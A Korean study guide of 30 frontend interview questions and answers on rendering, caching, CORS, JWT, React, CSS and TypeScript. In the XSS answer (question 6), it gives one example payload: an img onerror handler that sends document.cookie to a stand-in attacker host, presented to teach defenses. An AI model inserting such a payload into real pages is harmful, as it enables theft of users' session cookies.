# 2. 프론트엔드 핵심 면접 질문 30개

## 목차
1. [브라우저 렌더링 과정을 설명해주세요](#1-브라우저-렌더링-과정을-설명해주세요)
2. [Reflow와 Repaint의 차이는?](#2-reflow와-repaint의-차이는)
3. [Critical Rendering Path란?](#3-critical-rendering-path란)
4. [브라우저 캐싱 전략을 설명해주세요](#4-브라우저-캐싱-전략을-설명해주세요)
5. [CORS란 무엇인가요?](#5-cors란-무엇인가요)
6. [XSS와 CSRF의 차이와 방어 방법은?](#6-xss와-csrf의-차이와-방어-방법은)
7. [JWT 인증 방식을 설명해주세요](#7-jwt-인증-방식을-설명해주세요)
8. [Cookie, localStorage, sessionStorage 차이는?](#8-cookie-localstorage-sessionstorage-차이는)
9. [REST API vs GraphQL 차이는?](#9-rest-api-vs-graphql-차이는)
10. [HTTP/1.1 vs HTTP/2 vs HTTP/3 차이는?](#10-http11-vs-http2-vs-http3-차이는)
11. [Virtual DOM이란 무엇인가요?](#11-virtual-dom이란-무엇인가요)
12. [React의 Reconciliation 과정은?](#12-react의-reconciliation-과정은)
13. [React Hooks 규칙은 무엇인가요?](#13-react-hooks-규칙은-무엇인가요)
14. [useEffect 의존성 배열을 잘못 설정하면?](#14-useeffect-의존성-배열을-잘못-설정하면)
15. [React 리렌더링 최적화 방법은?](#15-react-리렌더링-최적화-방법은)
16. [React Context API의 한계는?](#16-react-context-api의-한계는)
17. [서버 사이드 렌더링(SSR)의 장단점은?](#17-서버-사이드-렌더링ssr의-장단점은)
18. [Code Splitting이란 무엇인가요?](#18-code-splitting이란-무엇인가요)
19. [Web Worker의 사용 사례는?](#19-web-worker의-사용-사례는)
20. [Service Worker와 PWA의 관계는?](#20-service-worker와-pwa의-관계는)
21. [Core Web Vitals란 무엇인가요?](#21-core-web-vitals란-무엇인가요)
22. [웹 접근성(Accessibility)이란?](#22-웹-접근성accessibility이란)
23. [Semantic HTML의 중요성은?](#23-semantic-html의-중요성은)
24. [CSS position 속성 종류와 차이는?](#24-css-position-속성-종류와-차이는)
25. [Flexbox와 Grid의 차이와 선택 기준은?](#25-flexbox와-grid의-차이와-선택-기준은)
26. [CSS 선택자 우선순위는?](#26-css-선택자-우선순위는)
27. [BEM 방법론이란?](#27-bem-방법론이란)
28. [CSS-in-JS vs CSS Modules 비교는?](#28-css-in-js-vs-css-modules-비교는)
29. [TypeScript를 사용하는 이유는?](#29-typescript를-사용하는-이유는)
30. [마이크로 프론트엔드(Micro Frontend)란?](#30-마이크로-프론트엔드micro-frontend란)

---

## 1. 브라우저 렌더링 과정을 설명해주세요

**답변:**
브라우저가 HTML을 화면에 표시하기까지의 과정은 다음과 같습니다.

1. **HTML 파싱 → DOM 트리 생성**: HTML을 파싱하여 DOM(Document Object Model) 트리 구축
2. **CSS 파싱 → CSSOM 트리 생성**: CSS를 파싱하여 CSSOM(CSS Object Model) 트리 구축
3. **Render Tree 생성**: DOM + CSSOM 결합, `display:none` 등 비표시 요소 제외
4. **Layout(Reflow)**: 각 요소의 크기와 위치 계산
5. **Paint(Repaint)**: 각 레이어를 픽셀로 변환
6. **Composite**: 레이어들을 합성하여 최종 화면 출력

```
HTML → DOM
CSS → CSSOM
     ↓
  Render Tree → Layout → Paint → Composite
```

**주의:** JavaScript는 DOM과 CSSOM 생성을 차단(Parser Blocking)할 수 있으므로 `<script>` 태그 위치와 `defer/async` 속성이 중요합니다.

---

## 2. Reflow와 Repaint의 차이는?

**답변:**
- **Reflow(Layout)**: 요소의 크기나 위치가 변경되어 레이아웃을 다시 계산하는 과정. 비용이 매우 큼.
- **Repaint(Paint)**: 레이아웃 변경 없이 시각적 스타일(색상, 배경 등)만 다시 그리는 과정. Reflow보다 비용이 낮음.

**Reflow 발생 원인:** `width`, `height`, `margin`, `padding`, `font-size`, DOM 추가/삭제, 창 크기 변경

**Repaint만 발생:** `color`, `background-color`, `visibility`, `border-radius`

```javascript
// 비효율적: 매번 Reflow 발생
element.style.width = "100px";
element.style.height = "200px";
element.style.margin = "10px";

// 효율적: 한 번만 Reflow
element.style.cssText = "width: 100px; height: 200px; margin: 10px;";
// 또는 class 변경
element.classList.add("new-style");
```

**GPU 가속 활용:** `transform`과 `opacity`는 Composite 레이어에서 처리되어 Reflow/Repaint를 유발하지 않습니다.

---

## 3. Critical Rendering Path란?

**답변:**
Critical Rendering Path(CRP)는 브라우저가 HTML, CSS, JavaScript를 처리하여 화면에 픽셀을 렌더링하기까지의 일련의 단계입니다. 이 경로를 최적화하면 첫 페이지 렌더링 시간(First Paint)을 단축할 수 있습니다.

**최적화 전략:**
1. **렌더 블로킹 리소스 제거**: CSS는 `<head>`, JS는 `defer`/`async` 사용
2. **CSS 최소화**: 미디어 쿼리로 불필요한 CSS 로드 방지
3. **JS 최소화**: 번들 크기 축소, 코드 스플리팅
4. **리소스 우선순위 지정**: `<link rel="preload">` 활용

```html
<!-- 렌더 블로킹 방지 -->
<link rel="stylesheet" href="critical.css" />
<link rel="stylesheet" href="print.css" media="print" />
<script src="app.js" defer></script>
<script src="analytics.js" async></script>

<!-- 중요 리소스 미리 로드 -->
<link rel="preload" href="hero-image.webp" as="image" />
```

---

## 4. 브라우저 캐싱 전략을 설명해주세요

**답변:**
브라우저 캐싱은 네트워크 요청을 줄여 성능을 향상시키는 핵심 전략입니다.

**캐시 제어 헤더:**
- `Cache-Control: max-age=3600`: 3600초 동안 캐시
- `Cache-Control: no-cache`: 캐시하되 매번 서버에 검증 요청
- `Cache-Control: no-store`: 캐시하지 않음
- `Cache-Control: immutable`: 변경되지 않음 (버전된 파일에 적합)
- `ETag`: 콘텐츠 해시 기반 변경 감지
- `Last-Modified`: 마지막 수정 시간 기반 변경 감지

**현대적 캐싱 전략:**
```
정적 파일 (JS, CSS): content hash 포함 파일명 + max-age=31536000, immutable
  → bundle.a3f4b2.js (영구 캐시)

HTML 파일: no-cache
  → 항상 최신 파일명(해시) 참조
```

---

## 5. CORS란 무엇인가요?

**답변:**
CORS(Cross-Origin Resource Sharing)는 브라우저의 동일 출처 정책(Same-Origin Policy)을 우회하여 다른 출처의 리소스에 접근할 수 있도록 하는 HTTP 헤더 기반 메커니즘입니다.

출처(Origin) = 프로토콜 + 호스트 + 포트

**동작 방식:**
1. **단순 요청(Simple Request)**: GET, POST(특정 Content-Type) → 브라우저가 직접 요청
2. **프리플라이트(Preflight)**: OPTIONS 메서드로 사전 요청 → 허용 여부 확인 후 본 요청

```
// 서버 응답 헤더
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

**해결 방법:** 서버에서 적절한 CORS 헤더 설정, 개발 환경에서는 프록시 서버 활용

---

## 6. XSS와 CSRF의 차이와 방어 방법은?

**답변:**

**XSS(Cross-Site Scripting):** 악의적인 스크립트를 웹 페이지에 삽입하여 사용자 브라우저에서 실행시키는 공격

```html
<!-- 공격 예시 -->
<img src="x" onerror="fetch('https://attacker.com?cookie='+document.cookie)" />
```

**XSS 방어:**
- 입력값 이스케이핑 (`<` → `&lt;`)
- CSP(Content Security Policy) 헤더 설정
- `HttpOnly` 쿠키로 JS에서 쿠키 접근 차단
- DOMPurify 등 라이브러리로 HTML 정제

**CSRF(Cross-Site Request Forgery):** 사용자가 인증된 상태에서 악의적인 사이트가 해당 사용자 권한으로 요청을 보내는 공격

**CSRF 방어:**
- CSRF 토큰 검증 (요청마다 고유 토큰)
- `SameSite=Strict/Lax` 쿠키 속성
- Referer/Origin 헤더 검증
- Double Submit Cookie 패턴

**핵심 차이:** XSS는 클라이언트 측 스크립트 실행, CSRF는 서버로의 의도치 않은 요청

---

## 7. JWT 인증 방식을 설명해주세요

**답변:**
JWT(JSON Web Token)는 사용자 인증 정보를 JSON 형태로 인코딩하여 서명한 토큰입니다.

**구조:** `Header.Payload.Signature` (Base64URL 인코딩)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  // Header
.eyJzdWIiOiIxMjM0IiwibmFtZSI6IuCFuuydtCJ9 // Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c // Signature
```

**인증 흐름:**
1. 로그인 시 서버가 JWT 발급
2. 클라이언트는 `Authorization: Bearer <token>` 헤더로 전송
3. 서버는 서명 검증으로 토큰 유효성 확인 (DB 조회 불필요)

**장점:** Stateless, 확장성 (마이크로서비스에 적합)
**단점:** 토큰 탈취 시 강제 만료 어려움, 페이로드 암호화 안 됨

**보안 강화:** Access Token(단기) + Refresh Token(장기) 조합, `httpOnly` 쿠키에 저장

---

## 8. Cookie, localStorage, sessionStorage 차이는?

**답변:**

| 구분 | Cookie | localStorage | sessionStorage |
|------|--------|-------------|----------------|
| 용량 | ~4KB | ~5MB | ~5MB |
| 만료 | 설정 가능 | 영구 | 탭 종료 시 삭제 |
| 서버 전송 | 자동 (요청마다) | 수동 | 수동 |
| 접근 범위 | 도메인/경로 설정 가능 | 같은 출처 | 같은 탭 |
| JS 접근 | 가능 (HttpOnly 제외) | 가능 | 가능 |

```javascript
// Cookie
document.cookie = "name=철수; max-age=3600; Secure; HttpOnly";

// localStorage
localStorage.setItem("theme", "dark");
localStorage.getItem("theme"); // "dark"

// sessionStorage
sessionStorage.setItem("formData", JSON.stringify(data));
```

**용도:** Cookie - 인증 토큰, localStorage - 사용자 설정/테마, sessionStorage - 임시 폼 데이터

---

## 9. REST API vs GraphQL 차이는?

**답변:**

**REST API:**
- 리소스 중심, URL로 엔드포인트 정의
- HTTP 메서드(GET, POST, PUT, DELETE) 활용
- 오버페칭(필요 이상 데이터)과 언더페칭(여러 번 요청) 문제

**GraphQL:**
- 단일 엔드포인트, 클라이언트가 필요한 데이터 구조를 쿼리로 정의
- 오버페칭/언더페칭 해결
- 강력한 타입 시스템

```graphql
# GraphQL 쿼리 - 필요한 필드만 요청
query {
  user(id: "1") {
    name
    email
    posts {
      title
    }
  }
}
```

**GraphQL 단점:** 캐싱이 복잡, 파일 업로드 처리 까다로움, 작은 프로젝트에는 오버엔지니어링

**선택 기준:** 다양한 클라이언트(앱, 웹 등)가 있거나 복잡한 데이터 관계가 있으면 GraphQL, 간단한 CRUD는 REST

---

## 10. HTTP/1.1 vs HTTP/2 vs HTTP/3 차이는?

**답변:**

**HTTP/1.1:**
- 요청/응답이 순차적 처리 (Head-of-Line Blocking)
- Keep-Alive로 연결 재사용
- 텍스트 기반 프로토콜

**HTTP/2:**
- 멀티플렉싱: 하나의 연결에서 여러 요청 동시 처리
- 헤더 압축(HPACK)
- 서버 푸시
- 바이너리 프레이밍
- 여전히 TCP 기반 (TCP 수준의 HOL Blocking 존재)

**HTTP/3:**
- QUIC 프로토콜 기반 (UDP 위에 구축)
- TCP HOL Blocking 완전 해소
- 연결 설정 시간 단축 (0-RTT)
- 이동 중 IP 변경에도 연결 유지

```
HTTP/1.1: 요청1 → 응답1 → 요청2 → 응답2 (순차)
HTTP/2:   요청1, 요청2, 요청3 → (동시) → 응답1, 응답2, 응답3
HTTP/3:   UDP + QUIC으로 더 빠르고 안정적
```

---

## 11. Virtual DOM이란 무엇인가요?

**답변:**
Virtual DOM은 실제 DOM의 가벼운 JavaScript 객체 표현입니다. UI 변경 사항을 실제 DOM에 직접 반영하는 대신, 먼저 Virtual DOM에서 변경을 계산한 후 최소한의 실제 DOM 조작만 수행합니다.

**동작 원리:**
1. 상태(state) 변경 발생
2. 새로운 Virtual DOM 트리 생성
3. 이전 Virtual DOM과 새 Virtual DOM 비교(Diffing)
4. 변경된 부분만 실제 DOM에 반영(Patch)

```javascript
// Virtual DOM 개념적 표현
const vdom = {
  type: "div",
  props: { className: "container" },
  children: [
    { type: "h1", props: {}, children: ["안녕하세요"] },
    { type: "p", props: {}, children: ["내용"] },
  ],
};
```

**오해 주의:** Virtual DOM이 항상 빠른 것은 아닙니다. 직접 DOM 조작이 적절히 최적화된 경우 Virtual DOM보다 빠를 수 있습니다. Virtual DOM의 가치는 성능보다 개발 편의성에 있습니다.

---

## 12. React의 Reconciliation 과정은?

**답변:**
Reconciliation은 React가 Virtual DOM의 변경 사항을 실제 DOM에 효율적으로 반영하는 알고리즘입니다.

**핵심 규칙:**
1. **타입이 다른 요소**: 기존 트리를 삭제하고 새로 구축
2. **타입이 같은 요소**: 속성만 업데이트
3. **key prop**: 리스트에서 요소의 동일성을 추적

```jsx
// key 없음: 비효율적 (모든 항목 재렌더링)
items.map((item) => <Item value={item} />);

// key 있음: 효율적 (변경된 항목만 업데이트)
items.map((item) => <Item key={item.id} value={item} />);
```

**React 18 - Concurrent Mode:**
- Fiber 아키텍처: 렌더링 작업을 청크로 분할
- 우선순위 기반 업데이트 스케줄링
- `startTransition`으로 낮은 우선순위 업데이트 표시

---

## 13. React Hooks 규칙은 무엇인가요?

**답변:**
React Hooks는 두 가지 핵심 규칙을 따라야 합니다.

**규칙 1: 최상위에서만 호출**
반복문, 조건문, 중첩 함수 안에서 Hook을 호출하면 안 됩니다. React는 Hook 호출 순서로 상태를 추적하기 때문입니다.

```jsx
// 잘못된 예시
function Component({ show }) {
  if (show) {
    const [value, setValue] = useState(""); // 조건문 안 - 규칙 위반!
  }
}

// 올바른 예시
function Component({ show }) {
  const [value, setValue] = useState(""); // 항상 동일한 순서로 호출
  if (!show) return null;
}
```

**규칙 2: React 함수 컴포넌트 또는 커스텀 Hook에서만 호출**
일반 JavaScript 함수에서는 Hook을 호출할 수 없습니다.

**eslint-plugin-react-hooks**: 이 규칙들을 자동으로 검사해주는 공식 ESLint 플러그인

---

## 14. useEffect 의존성 배열을 잘못 설정하면?

**답변:**
`useEffect`의 의존성 배열은 effect가 재실행되어야 할 값들의 목록입니다.

**문제 상황:**

```jsx
// 문제 1: 빈 배열인데 내부에서 props/state 사용 (클로저 함정)
useEffect(() => {
  setInterval(() => {
    console.log(count); // 항상 초기값 0 출력 (스테일 클로저)
  }, 1000);
}, []); // count가 변해도 effect 재실행 안 됨

// 문제 2: 의존성 과다 - 불필요한 재실행
useEffect(() => {
  fetchData(userId);
}, [userId, someObject]); // someObject가 매 렌더링마다 새로 생성되면 무한 루프

// 올바른 방법
useEffect(() => {
  fetchData(userId);
}, [userId]); // 실제로 필요한 의존성만

// 함수를 의존성으로 넣어야 한다면 useCallback으로 감싸기
const stableFn = useCallback(() => {}, [dep]);
useEffect(() => { stableFn(); }, [stableFn]);
```

**원칙:** ESLint `exhaustive-deps` 규칙을 따르되, 함수와 객체는 `useCallback`/`useMemo`로 안정화

---

## 15. React 리렌더링 최적화 방법은?

**답변:**
React 컴포넌트는 props나 state 변경 시 리렌더링됩니다. 불필요한 리렌더링을 방지하는 방법들입니다.

```jsx
// 1. React.memo: props가 변경되지 않으면 리렌더링 방지
const ExpensiveComponent = React.memo(({ data }) => {
  return <div>{data.name}</div>;
});

// 2. useMemo: 비용이 큰 계산 결과 캐싱
const sortedList = useMemo(
  () => list.sort((a, b) => a.score - b.score),
  [list]
);

// 3. useCallback: 함수 참조 안정화
const handleClick = useCallback(
  (id) => {
    dispatch({ type: "SELECT", id });
  },
  [dispatch]
);

// 4. 상태 분리: 자주 변경되는 상태를 하위 컴포넌트로 이동
// 5. 컴포넌트 구조 최적화: children prop 활용
```

**주의:** 모든 것을 메모이제이션하는 것은 오히려 성능 저하를 유발할 수 있습니다. 실제 병목 지점을 프로파일러로 확인 후 적용하세요.

---

## 16. React Context API의 한계는?

**답변:**
Context API는 prop drilling을 해결하는 유용한 도구이지만 몇 가지 한계가 있습니다.

**주요 한계:**
1. **불필요한 리렌더링**: Context 값이 변경되면 해당 Context를 구독하는 모든 컴포넌트가 리렌더링됨
2. **세분화 어려움**: 큰 Context 객체의 일부만 구독할 수 없음
3. **디버깅 복잡**: 여러 Context가 중첩될 경우 추적 어려움

```jsx
// 문제: count만 필요한데 theme이 바뀌어도 리렌더링
const AppContext = createContext({ count: 0, theme: "light" });

// 해결: Context 분리
const CountContext = createContext(0);
const ThemeContext = createContext("light");
```

**대안:**
- 자주 변경되는 전역 상태: Zustand, Jotai (atom 단위 구독)
- 서버 상태: React Query, SWR
- Context + `useMemo`로 값 안정화

---

## 17. 서버 사이드 렌더링(SSR)의 장단점은?

**답변:**
SSR은 서버에서 HTML을 미리 생성하여 클라이언트에 전달하는 방식입니다.

**장점:**
- **SEO**: 검색 엔진이 완성된 HTML을 크롤링 가능
- **빠른 FCP(First Contentful Paint)**: 사용자가 콘텐츠를 빨리 볼 수 있음
- **느린 기기/네트워크에 유리**: 클라이언트 처리 부담 감소

**단점:**
- **TTFB(Time To First Byte) 증가**: 서버 렌더링 시간 필요
- **서버 부하 증가**: 요청마다 렌더링
- **Hydration 비용**: 서버 HTML과 클라이언트 JS를 연결하는 과정
- **개발 복잡도**: 서버/클라이언트 환경 차이 처리

**렌더링 전략 비교:**
| 방식 | 특징 | 적합한 경우 |
|------|------|------------|
| CSR | 클라이언트에서 렌더링 | 관리자 대시보드 |
| SSR | 요청마다 서버 렌더링 | 사용자별 동적 콘텐츠 |
| SSG | 빌드 타임 정적 생성 | 블로그, 문서 |
| ISR | 주기적 정적 갱신 | 뉴스, 상품 목록 |

---

## 18. Code Splitting이란 무엇인가요?

**답변:**
Code Splitting은 번들을 여러 청크로 나누어 필요할 때만 로드하는 최적화 기법입니다. 초기 로딩 시간을 단축시킵니다.

```jsx
// React.lazy와 Suspense를 이용한 라우트 기반 코드 스플리팅
import React, { lazy, Suspense } from "react";

const Dashboard = lazy(() => import("./pages/Dashboard"));
const Profile = lazy(() => import("./pages/Profile"));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/profile" element={<Profile />} />
      </Routes>
    </Suspense>
  );
}
```

**방법:**
- **라우트 기반**: 페이지별 분리 (가장 효과적)
- **컴포넌트 기반**: 모달, 탭 등 조건부 렌더링 컴포넌트
- **라이브러리 분리**: 벤더 청크와 앱 코드 분리

**Webpack magic comment:**
```javascript
import(/* webpackChunkName: "chart" */ "./Chart");
```

---

## 19. Web Worker의 사용 사례는?

**답변:**
Web Worker는 메인 스레드와 별도로 백그라운드에서 JavaScript를 실행하는 API입니다. UI 블로킹 없이 무거운 연산을 처리할 수 있습니다.

```javascript
// worker.js
self.addEventListener("message", (e) => {
  const result = heavyComputation(e.data);
  self.postMessage(result);
});

// main.js
const worker = new Worker("worker.js");
worker.postMessage(largeData);
worker.onmessage = (e) => {
  console.log("결과:", e.data); // 메인 스레드 블로킹 없음
};
```

**주요 사용 사례:**
- 대용량 데이터 파싱 (CSV, JSON)
- 이미지/영상 처리
- 암호화/복호화
- 수학적 시뮬레이션
- 오프라인 전문 검색 (Lunr.js 등)

**제한:** DOM 접근 불가, 동일 출처 정책 적용

---

## 20. Service Worker와 PWA의 관계는?

**답변:**
Service Worker는 브라우저와 네트워크 사이에서 프록시 역할을 하는 스크립트로, PWA(Progressive Web App)의 핵심 기술입니다.

**Service Worker 주요 기능:**
- **오프라인 캐싱**: 네트워크 요청 가로채기 및 캐시 응답
- **백그라운드 동기화**: 오프라인 중 발생한 작업을 온라인 시 처리
- **푸시 알림**: 앱이 닫혀있어도 알림 수신

```javascript
// service-worker.js
self.addEventListener("install", (e) => {
  e.waitUntil(
    caches.open("v1").then((cache) =>
      cache.addAll(["/", "/styles.css", "/app.js"])
    )
  );
});

self.addEventListener("fetch", (e) => {
  e.respondWith(
    caches.match(e.request).then((res) => res || fetch(e.request))
  );
});
```

**PWA 요건:** HTTPS, Web App Manifest, Service Worker

---

## 21. Core Web Vitals란 무엇인가요?

**답변:**
Core Web Vitals는 Google이 정의한 사용자 경험 측정 지표로, 검색 순위에도 영향을 줍니다.

**3가지 핵심 지표:**

| 지표 | 의미 | 좋음 | 개선 필요 |
|------|------|------|----------|
| LCP (Largest Contentful Paint) | 가장 큰 콘텐츠 렌더링 시간 | ≤2.5s | >4s |
| INP (Interaction to Next Paint) | 상호작용 응답 시간 | ≤200ms | >500ms |
| CLS (Cumulative Layout Shift) | 누적 레이아웃 이동 점수 | ≤0.1 | >0.25 |

**개선 방법:**
- LCP: 이미지 최적화, CDN, 리소스 preload
- INP: JS 실행 시간 단축, 메인 스레드 여유 확보
- CLS: 이미지/광고에 크기 명시, 동적 콘텐츠 위치 예약

---

## 22. 웹 접근성(Accessibility)이란?

**답변:**
웹 접근성은 장애를 가진 사용자를 포함한 모든 사람이 웹 콘텐츠를 동등하게 사용할 수 있도록 보장하는 것입니다.

**WCAG 4가지 원칙 (POUR):**
- **Perceivable(인식 가능)**: 모든 정보를 사용자가 인식할 수 있어야 함
- **Operable(운용 가능)**: 키보드로 모든 기능 사용 가능
- **Understandable(이해 가능)**: 명확한 언어, 예측 가능한 동작
- **Robust(견고함)**: 다양한 보조 기술과 호환

```html
<!-- 접근성 적용 예시 -->
<button
  aria-label="장바구니에 추가"
  aria-describedby="price-info"
  disabled={isLoading}
>
  <img src="cart.svg" alt="" role="presentation" />
  구매하기
</button>

<!-- 이미지 대체 텍스트 -->
<img src="chart.png" alt="2024년 분기별 매출 그래프, 4분기 최대 성장" />

<!-- 키보드 포커스 관리 -->
<div role="dialog" aria-modal="true" aria-labelledby="dialog-title">
```

---

## 23. Semantic HTML의 중요성은?

**답변:**
Semantic HTML은 콘텐츠의 의미를 명확히 전달하는 HTML 요소를 사용하는 것입니다.

**중요한 이유:**
1. **SEO**: 검색 엔진이 콘텐츠 구조와 중요도를 파악
2. **접근성**: 스크린 리더가 페이지 구조를 올바르게 해석
3. **유지 보수성**: 코드 의도가 명확해짐
4. **브라우저 기본 동작**: `<button>`, `<a>` 등의 기본 키보드 동작

```html
<!-- 비시멘틱 -->
<div class="header">
  <div class="nav">
    <div class="nav-item" onclick="navigate()">메뉴</div>
  </div>
</div>

<!-- 시멘틱 -->
<header>
  <nav>
    <ul>
      <li><a href="/about">소개</a></li>
    </ul>
  </nav>
</header>

<main>
  <article>
    <h1>제목</h1>
    <section>
      <h2>섹션 제목</h2>
    </section>
  </article>
  <aside>관련 콘텐츠</aside>
</main>

<footer>푸터 내용</footer>
```

---

## 24. CSS position 속성 종류와 차이는?

**답변:**

| 값 | 설명 | 기준 |
|----|------|------|
| `static` | 기본값, 일반 흐름 | - |
| `relative` | 일반 흐름 유지, 자신의 원래 위치 기준으로 이동 | 자기 자신 |
| `absolute` | 일반 흐름에서 제거, 가장 가까운 positioned 조상 기준 | positioned 조상 |
| `fixed` | 뷰포트 기준으로 고정 | 뷰포트 |
| `sticky` | 스크롤에 따라 relative와 fixed 전환 | 스크롤 컨테이너 |

```css
/* sticky 예시: 헤더가 스크롤 시 상단에 고정 */
.header {
  position: sticky;
  top: 0;
  z-index: 100;
}

/* absolute 사용 시 부모에 relative 필요 */
.container {
  position: relative;
}
.tooltip {
  position: absolute;
  top: 100%;
  left: 0;
}
```

---

## 25. Flexbox와 Grid의 차이와 선택 기준은?

**답변:**
- **Flexbox**: 1차원 레이아웃 (행 또는 열 방향)
- **Grid**: 2차원 레이아웃 (행과 열 동시 제어)

```css
/* Flexbox - 네비게이션 바 (1차원) */
.nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 16px;
}

/* Grid - 카드 레이아웃 (2차원) */
.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 24px;
}

/* Grid - 전체 페이지 레이아웃 */
.layout {
  display: grid;
  grid-template-areas:
    "header header"
    "sidebar main"
    "footer footer";
  grid-template-columns: 240px 1fr;
}
```

**선택 기준:**
- 한 방향 정렬 → Flexbox
- 복잡한 그리드 레이아웃 → Grid
- 실제로는 함께 사용 (Grid로 전체 레이아웃, Flexbox로 컴포넌트 내부)

---

## 26. CSS 선택자 우선순위는?

**답변:**
CSS 우선순위(Specificity)는 여러 규칙이 충돌할 때 어떤 스타일이 적용될지 결정합니다.

**우선순위 (높은 순서):**
1. `!important` (사용 지양)
2. 인라인 스타일 `style="..."`
3. ID 선택자 `#id` (0,1,0,0)
4. 클래스, 속성, 가상 클래스 `.class`, `[attr]`, `:hover` (0,0,1,0)
5. 요소, 가상 요소 `div`, `::before` (0,0,0,1)
6. 전체 선택자 `*`, 결합자 (0,0,0,0)

```css
/* 우선순위 계산 예시 */
#header .nav a:hover  /* 0,1,1,1 */
.nav a              /* 0,0,1,1 */
a                   /* 0,0,0,1 */

/* 명시도가 같으면 나중에 선언된 규칙이 적용 */
```

**BEM과 같은 방법론은** 낮은 명시도를 유지하여 예측 가능성을 높입니다.

---

## 27. BEM 방법론이란?

**답변:**
BEM(Block Element Modifier)은 CSS 클래스 네이밍 규칙으로, 컴포넌트 기반의 예측 가능하고 재사용 가능한 CSS를 작성하는 방법론입니다.

- **Block**: 독립적인 컴포넌트 단위 (`card`, `nav`, `form`)
- **Element**: Block의 구성 요소 (`card__title`, `card__image`)
- **Modifier**: Block이나 Element의 변형 (`card--featured`, `btn--large`)

```html
<div class="card card--featured">
  <img class="card__image" src="..." alt="..." />
  <div class="card__content">
    <h2 class="card__title">제목</h2>
    <p class="card__description">설명</p>
    <button class="btn btn--primary btn--large">더보기</button>
  </div>
</div>
```

```css
.card { /* Block */ }
.card--featured { /* Modifier */ }
.card__title { /* Element */ }
.card__title--highlighted { /* Element Modifier */ }
```

**장점:** 낮은 명시도, 명확한 의도, 재사용성, 컴포넌트 독립성

---

## 28. CSS-in-JS vs CSS Modules 비교는?

**답변:**

**CSS Modules:**
- 파일 단위로 스코프를 지역화하는 방식
- 빌드 타임에 고유 클래스명 생성
- 표준 CSS 문법 그대로 사용

```css
/* Button.module.css */
.button { background: blue; }
.primary { color: white; }
```

```jsx
import styles from "./Button.module.css";
<button className={styles.button}>클릭</button>
```

**CSS-in-JS (Styled-components, Emotion):**
- JavaScript로 스타일 작성, props로 동적 스타일링
- 런타임에 스타일 생성 (성능 이슈 가능)

```jsx
const Button = styled.button`
  background: ${(props) => (props.primary ? "blue" : "white")};
  color: ${(props) => (props.primary ? "white" : "black")};
`;
```

| 구분 | CSS Modules | CSS-in-JS |
|------|------------|-----------|
| 성능 | 빌드 타임 | 런타임 오버헤드 |
| 동적 스타일 | 어려움 | 용이 |
| 번들 크기 | 작음 | 라이브러리 포함 |
| DX | 익숙한 CSS | JS 중심 |

---

## 29. TypeScript를 사용하는 이유는?

**답변:**
TypeScript는 JavaScript에 정적 타입 시스템을 추가한 슈퍼셋입니다.

**주요 이점:**

1. **컴파일 타임 에러 감지**: 런타임 전에 타입 관련 버그 발견
2. **IntelliSense/자동 완성**: IDE 지원 향상, 개발 생산성 증가
3. **코드 문서화**: 타입이 곧 문서 역할
4. **리팩토링 안전성**: 타입 오류가 있는 변경 즉시 감지

```typescript
// 타입 안전성 예시
interface User {
  id: number;
  name: string;
  email: string;
  role: "admin" | "user";
}

function updateUser(userId: number, updates: Partial<User>): Promise<User> {
  // 잘못된 타입 전달 시 컴파일 에러
  return api.patch(`/users/${userId}`, updates);
}

// 제네릭으로 재사용 가능한 타입
function getFirst<T>(array: T[]): T | undefined {
  return array[0];
}
```

**트레이드오프:** 초기 학습 비용, 빌드 단계 추가, 과도한 타입 정의로 인한 복잡도

---

## 30. 마이크로 프론트엔드(Micro Frontend)란?

**답변:**
마이크로 프론트엔드는 마이크로서비스 아키텍처를 프론트엔드에 적용한 개념으로, 하나의 큰 프론트엔드 앱을 독립적으로 개발/배포 가능한 작은 앱들로 분리하는 방법입니다.

**구현 방식:**
1. **iframe**: 가장 강한 격리, UX 제한
2. **Web Components**: 표준 기반, 프레임워크 독립
3. **Module Federation (Webpack 5)**: 런타임에 원격 모듈 로드
4. **단일 SPA**: 라우팅 기반 통합 프레임워크

```javascript
// Webpack Module Federation 예시
// host/webpack.config.js
new ModuleFederationPlugin({
  remotes: {
    checkout: "checkout@https://checkout.example.com/remoteEntry.js",
  },
});

// 사용
const CheckoutApp = lazy(() => import("checkout/App"));
```

**장점:** 팀 독립성, 독립 배포, 기술 스택 혼용 가능
**단점:** 번들 중복, 통합 복잡도, 공유 상태 관리 어려움, 성능 오버헤드

**적합한 경우:** 팀이 크고 도메인이 명확히 분리되는 대규모 프로젝트
